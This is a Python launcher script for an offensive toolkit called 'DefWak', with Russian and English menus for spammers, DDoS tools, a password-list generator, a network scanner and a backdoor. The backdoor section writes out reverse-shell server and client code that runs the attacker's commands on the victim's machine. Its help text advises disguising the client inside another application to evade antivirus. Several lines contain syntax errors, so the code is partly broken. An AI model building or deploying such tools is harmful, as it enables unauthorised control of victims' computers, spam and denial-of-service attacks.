#code written and owned by DefSec16 or Alisher Zhussip
#код написанный и принадлежащий DefSec16 или Алишер Жусiп
import os, random, time
def clean():
	try:
		os.system('clear')
	except:
		os.system('cls')
clean()
ban = random.randint(0,2)
if ban ==0:
  banner =''' \u001b[32m
    ============================================                                           
        _____        ____          __   _    
       |  __ \      / _\ \        / /  | |   
       | |  | | ___| |_ \ \  /\  / /_ _| | __
       | |  | |/ _ \  _| \ \/  \/ / _` | |/ /
       | |__| |  __/ |    \  /\  / (_| |   < 
       |_____/ \___|_|     \/  \/ \__,_|_|\_\   
       
     -----------{Defensive Weakness}------------
    ============================================                                  
       '''

elif ban ==2:
  banner = ''' \u001b[32m
                                                                                          
        88888888ba,                   ad88  I8,        8        ,8I            88         
        88      `"8b                 d8"    `8b       d8b       d8'            88         
        88        `8b                88      "8,     ,8"8,     ,8"             88         
        88         88   ,adPPYba,  MM88MMM    Y8     8P Y8     8P  ,adPPYYba,  88   ,d8   
        88         88  a8P_____88    88       `8b   d8' `8b   d8'  ""     `Y8  88 ,a8"    
        88         8P  8PP"""""""    88        `8a a8'   `8a a8'   ,adPPPPP88  8888[      
        88      .a8P   "8b,   ,aa    88         `8a8'     `8a8'    88,    ,88  88`"Yba,   
        88888888Y"'     `"Ybbd8"'    88          `8'       `8'     `"8bbdP"Y8  88   `Y8a       '''
else:
  banner = ''' \u001b[32m
              ``             /\               /.
              :d.           :Nm.            .s+       
              /MN-         .m:/N-          `mmN       
              /N:N:       .m+  :N-         hs/N       
              /N -N/     `do    -N:       hh /N       
              /N  .m+    hy      -N:     sh` /N       
              /N   .mo  sh`       -m+   od`  /N       
              /N    `dsom`         .m+ +m.   /N       
              :MyyyyyhMMdyyyyyyyyyyydMhMdyyyydm       
                     :Nhh`           :My              
                    -N: sd`         -N/hy             
                   .m+   om`       .m+  hy`           
                  `do     +m.     `do    yh`          
                  hy       /m.    dy      sh`         
                 yh         /N:  hy        om`        
                om`          -N/yh`         om.       
               /m.            -md`           +m.      
              ''`                             ::           
                                                     '''


print(banner)
text ='''          
					~Code by Alisher
					version 1.4
	  ~-{Main Menu}-~
         ~-{Главное Меню}-~
      Что вам будет угодно?(what do you want?)
        [1]-DSpamers
        [2]-D-ddos
        [3]-passgen
	[4]-backdoor[Скоро]
	[5]-SkanNet
	[6]-fishing[Скоро]
	[7]-В плане
	
	[99]-Информация(Information)
	[98]-Удалить программу
	[97]-Обновить
	[0]-Выход(exit)
       (select number)Выберите номер:
        '''
print(text)
a = int(input("DefWak~#:"))
def otv():
	yes = {'yes','y', 'ye','ys','Y','Yes','YES','YE','YS','Да','ДА','Д','д','да','Yeah','YEAH','yeah'}
	no = {'no','n','NO','No','N','Нет','нет','Н','н','НЕ','не','НЕТ','Не','Неа','НЕА','nope','Nope','NOPE'}

	otvet = input('info~#:')
	if otvet in yes:
		os.system("python defwak.py")
	elif otvet in no:
		print("Прощайте!(Goodbye!)")
		raise SystemExit
	else:
		print("Дайте пожалуйста ответ(Please,give an answer)")
		otv()
def delete():
	os.system('bash uninstall.sh')
def DefSec0():
	print("Прощайте!(Goodbye!)")
	raise SystemExit
def DefSec1():
    os.system("python Spamers.py")
 
def DefSec2():
	os.system('python D-ddos.py')
def DefSec3():
  	os.system('python PassGen.py')
def DefSec4():
	clean()
	ban = random.randint(0,2)
	if ban == 0:
		  banner = '''
	    ______            _       _                   
	    | ___ \          | |     | |                  
	    | |_/ / __ _  ___| | ____| | ___   ___  _ __  
	    | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__| 
	    | |_/ / (_| | (__|   < (_| | (_) | (_) | |    
	    \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|  '''  
	elif ban == 2:
		   banner = '''                                                                                                    
		  88888888ba                           88                 88                                           
		  88      "8b                          88                 88                                           
		  88      ,8P                          88                 88                                           
		  88aaaaaa8P'  ,adPPYYba,   ,adPPYba,  88   ,d8   ,adPPYb,88   ,adPPYba,    ,adPPYba,   8b,dPPYba,     
		  88""""""8b,  ""     `Y8  a8"     ""  88 ,a8"   a8"    `Y88  a8"     "8a  a8"     "8a  88P'   "Y8     
		  88      `8b  ,adPPPPP88  8b          8888[     8b       88  8b       d8  8b       d8  88             
		  88      a8P  88,    ,88  "8a,   ,aa  88`"Yba,  "8a,   ,d88  "8a,   ,a8"  "8a,   ,a8"  88             
		  88888888P"   `"8bbdP"Y8   `"Ybbd8"'  88   `Y8a  `"8bbdP"Y8   `"YbbdP"'    `"YbbdP"'   88         '''   
	else:
		    banner = '''
		      ``             /\               /.
		      :d.           :Nm.            .s+       
		      /MN-         .m:/N-          `mmN       
		      /N:N:       .m+  :N-         hs/N       
		      /N -N/     `do    -N:       hh /N       
		      /N  .m+    hy      -N:     sh` /N       
		      /N   .mo  sh`       -m+   od`  /N       
		      /N    `dsom`         .m+ +m.   /N       
		      :MyyyyyhMMdyyyyyyyyyyydMhMdyyyydm       
			    :Nhh`           :My              
			   -N:sd`          -N/hy             
			  .m+   om`       .m+  hy`           
			 `do     +m.     `do    yh`          
			 hy       /m.    dy      sh`         
			yh         /N:  hy        om`        
		       om`          -N/yh`         om.       
		      /m.            -md`           +m.      
		      ''`                             ::           
							  '''
	print(banner)
	text = ''' 	
	             
	     [1]-backdoorV1
	     [2]-backdoorV2
	     [3]-Применение(application)
	     
	     [99]-Назад в главное меню(back to main menu)
	     [0]-Выход(Exit)
	     '''
	print(text)
	back = int(input("Backdoor~#:"))
	def Backdoor0():
		print("Прощайте!(Goodbye!)")
		raise SystemExit
	def Backdoor1():
		banner1 = '''
			______            _       _                         __  
	| ___ \          | |     | |                       /  | 
	| |_/ / __ _  ___| | ____| | ___   ___  _ __ ______`| | 
	| ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|______|| | 
	| |_/ / (_| | (__|   < (_| | (_) | (_) | |         _| |_
	\____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|         \___/
                                                        
                                                        
		'''
		print(banner1)
		text1 = '''
		[1]-server (Создать)(Create)
		[2]-client (Создать)(Create)
		
		[99]-Назад в главное меню(back to main menu)
		[0]-Выход(Exit)
		'''
		print(text1)
		bdv1 = int(input('Backdoor~#:'))
		def Backdoor0():
			print("Прощайте!(Goodbye!)")
			raise SystemExit
		def Backdoor99():
			DefSec4()
		def BackdoorS():
			os.chdir('USER-BD')
			ip = input('Введите свой IP')
			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			n = open(f,"w",encoding='utf-8')
			n.write("""import socket, json
#Хакер
class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port)) 
		listener.listen(0)
		print('[*] Waiting for incoming connections')
		self.connection, address = listener.accept()
		print('[*] got a connection from' + str(address))

	def reliable_send(self, data):
		json_data = json.dumps(data):
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.connection.send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		
		return self.reliable_receive()

		return self.connection.recv(1024)
	def go(self):
		while True:
			command = input("~#")
			command = command.split(" ")
			result = self.execute_remotely(command)
			print(result)
my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
my_listener.go() """
		n.close()
		break
				
		BackdoorC():
			os.chdir('USER-BD')
			ip = input('Введите свой IP')
			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
			n = open(f,"w",encoding='utf-8')
			n.write("""#Жертва
import socket
import subprocess
import json
class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	def reliable_send(self, data):
		json_data = json.dumps(data):
		self.connection.send(json_data)
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def execute_system_command(self, command):

		return subprocess.check_output(command, shell=True)
	def run(self):
		while True:
			command = self.reliable_receive()
			if command[0] == "exit":
				self.connection.close()
				exit()
			command_result = self.execute_system_command(command)
			self.reliable_send(command_result)
	
my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
my_backdoor.run() """
		n.close()
		break
				
		if bdv1 ==1:
			BackdoorS()
		elif bdv1 ==2:
			BackdoorC()
		elif bdv1 ==99:
			Backdoor99()
		elif bdv1 ==0:
			Backdoor0()
	def Backdoor2():
		print("Скоро(soon)")
		time.sleep(5)
		DefSec4()
	def Backdeoo3():
		text = ''' \033[33m
		Рус-RU
		И так я написал простенький бэкдор состоит он из:
		1-Клиент для жертвы
		2-Сервер для хакера
		В папке USER-BD будут сохранены файлы backdoor
		Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
		то есть соединение будет происходить к серверу.
		НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
		Что бы всё работало необходимо:когда клиент и сервер оба включены 
		Когда всё прошло успешно вы можете управлять системой через терминал
		P.s Учитывая какая ОС таким и команды нужно вводить
		
		Англ-Eng
		And so I wrote a simple backdoor it consists of:
		1-Client for the victim
		2-Server for the hacker
		Backdoor files will be saved in the USER-BD folder
		So that antiviruses do not fire backdoor, the connection is made by the victim itself,
		that is, the connection will occur to the server.
		BUT before using the Client must be encrypted and glued with the application
		For everything to work, it’s necessary: when the client and server are both turned on
		When everything went well you can control the system through the terminal
		P.s Given which OS and commands you need to enter	'''
		print(text)
		print('Перейти в главное меню?(Go to the main menu?)\n Да/Нет | Yes/No')
		otv()
	def Backdoor99():
		import os
		os.system("python defwak.py")
	if back == 0:
		Backdoor0()
	elif back == 99:
		Backdoor99()
	elif back ==1:
		Backdoor1()
	elif back ==2:
		Backdoor2()
	elif back ==3:
		Backdoor3()
	else:
		print("Не найдено(Not found)")
def DefSec99():
	clean()
	texta = """
	\033[33m
	Рус-RU
	Информация о программах:
	1)DSpamers - DefineSpamers 
	  Перевод:Определить спамер
	  на данный момент есть 3 версии спамеров
	2)D-DDos - DefineDDos 
	  Перевод: Определить ДДосер
	  на данный момент есть 3 разных ддосреа
	3)PassGen - Password Generation
	  Перевод: Генерация пароля
	  Оно генерирует пароли по ключевым словам,
	  чем больше слов тем обширнее список паролей.
	  Список паролей сохраняется в txt формате
	4)BackDoor - Черный вход 
	  Нужен для удаленного контроля при помощи терминала.
	  состоит из клиента который должен запустить мамонт(Жертва)
	и сервера который должен запустить хакер 
	5)SkanNet -Skaner Network
	  Перевод:Сконирование сети
	  Сканирует и отправляет пакеты на запрос МАК Адреса
	  нужно быть в одной сети работает на Linux
	  
	Англ-Eng
	Information about the programs:
	1)DSpamers - DefineSpamers
	  Сurrently there are 3 versions of spammers
	2)D-DDos - DefineDDos 
	  at the moment there are 3 different ddos
	3)PassGen - Password Generation
	  It generates passwords for keywords,
	  the more words, the more extensive the password list.
	  Password list saved in txt format
	4)BackDoor 
	  Required for remote control using the terminal.
	  consists of a client who must launch a mammoth (victim)
	  and the server on which the hacker should work
	5)SkanNet -Skaner Network
	  Scans and sends packets to request a MAC address
	  must be on the same network (linux)"""
	print(texta)
	print('Перейти в главное меню?(Go to the main menu?)\n Да/Нет | Yes/No')
	otv()
def DefSec97():
	os.system('bash upgrade.sh')
def DefSec5():
	os.chdir("SkanNet")
	os.system("python3 skannet.py")
def upmenu():
	print("1-Termux  2-Linux")
	ue = int(input("Что у вас?(What do you have?)"))
	if ue ==1:
	      print('Будет сделано(Will be done!)')
	      timr.sleep(2)
	      os.system('bash upgrade.sh')
	elif ue ==2:
	      print('Будет сделано(Will be done!)')
	      timr.sleep(2)
	      os.system('bash upgradeLinux.sh')
	else:
	      print('Ошибка:не найдено(Error:not found)')
	      upmenu()
	      
if a ==0:
  DefSec0()
elif a ==1:
  DefSec1()
elif a ==2:
  DefSec2()
elif a ==3:
  DefSec3()
elif a ==4:
  DefSec4()
elif a ==5:
  DefSec5()
elif a ==99:
  DefSec99()
elif a ==98:
	delete()
elif a ==97:
	DefSec97()
else:
	print('Ошибка:не найдено(Error:not found)')
	time.sleep(3)
	os.system("python defwak.py")
